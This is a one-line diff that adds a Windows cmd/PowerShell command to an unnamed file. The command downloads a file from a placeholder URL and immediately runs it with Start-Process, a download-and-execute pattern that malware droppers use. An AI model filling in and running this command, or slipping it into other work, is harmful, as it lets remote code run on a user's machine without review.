@@ -1,0 +1,1 @@
+cmd /c "powershell -Command "(New-Object System.Net.WebClient).DownloadFile('url', 'path'); Start-Process 'path'"
